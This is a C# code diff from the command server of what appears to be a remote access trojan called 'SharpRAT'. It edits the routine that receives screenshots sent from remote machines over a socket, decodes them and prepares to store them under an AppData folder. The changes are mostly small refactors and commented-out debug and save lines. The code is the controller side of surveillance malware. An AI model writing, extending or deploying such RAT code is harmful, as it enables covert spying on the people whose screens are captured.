@@ -5,6 +5,7 @@ using Server.UI;
 using System.Diagnostics;
 using System.Drawing.Imaging;
 using System.Drawing;
+using System.Runtime.InteropServices;
 
 namespace Server.Server
 {
@@ -114,7 +115,7 @@ namespace Server.Server
         {
             Debug.WriteLine("starting data parsing");
             string tempString = data.Replace("<EOF>", "");
-            Debug.WriteLine($"{data}");
+            //Debug.WriteLine($"{data}");
             if (tempString.StartsWith("<SCREENSHOT>"))
             {
                 Debug.WriteLine("string started with screenshot");
@@ -203,7 +204,6 @@ namespace Server.Server
                 Log.Error("SendCallback: " + e.Message);
             }
         }
-        private static readonly ImageConverter _imageConverter = new ImageConverter();
         public static Bitmap GetImageFromByteArray(byte[] byteArray)
         {
             Bitmap bm = (Bitmap)_imageConverter.ConvertFrom(byteArray);
@@ -220,6 +220,7 @@ namespace Server.Server
 
             return bm;
         }
+        private static readonly ImageConverter _imageConverter = new ImageConverter();
         public static void Readimage(string data)
         {
             try
@@ -227,24 +228,28 @@ namespace Server.Server
                 Debug.WriteLine("screenshot read function started");
                 data = data.Replace("<SCREENSHOT>", "");
                 data = data.Replace("<EOF>", "");
-                //clientSocket.Receive(dataSize);
 
+                //receive string form of b, turn it into byte array bx
                 byte[] bx = Encoding.ASCII.GetBytes(data);
+
+                
+
+
                 //byte[] bx = Convert.ToBase64String(plainTextBytes);
                 if (bx.Length > 0)
                 {
-                    //string base64 = Convert.ToBase64String(dataSize);
-                    //base64 = base64.Replace("<SCREENSHOT>", "");
-                    //base64 = base64.Replace("<EOF>", "");
-                    //byte[] bx = Convert.FromBase64String(base64);
-                    string imageName = "Image-" + System.DateTime.Now.Ticks + ".JPG";
-                    //string imageName = string.Format(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +  @"\SharpRAT\screenshotServer\" + System.DateTime.Now.Ticks + ".Jpeg");
-                    //MemoryStream ms = new MemoryStream(bx);
-                    //Image.FromStream(new MemoryStream());
-                    Image img =GetImageFromByteArray(bx);
-                    img.Save(imageName, ImageFormat.Jpeg);
-                    //ms.Close();
-                    Debug.WriteLine("screenshot retrieved successfully");
+                    string imageName = string.Format(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +  @"\SharpRAT\screenshotServer\screenshot" + System.DateTime.Now.Ticks + ".png");
+                    using (var ms = new MemoryStream(bx))
+                    {
+                        Image x = Image.FromStream(ms);
+                        //x.Save(imageName);
+                    }
+                    //Bitmap newBitmap = GetImageFromByteArray(bx);
+
+                    //newBitmap.Save(imageName);
+                    //Bitmap img = new Bitmap(GetImageFromByteArray(bx));
+                    //Debug.WriteLine("screenshot retrieved successfully");
+                    
                 }
             }
             catch (Exception e)
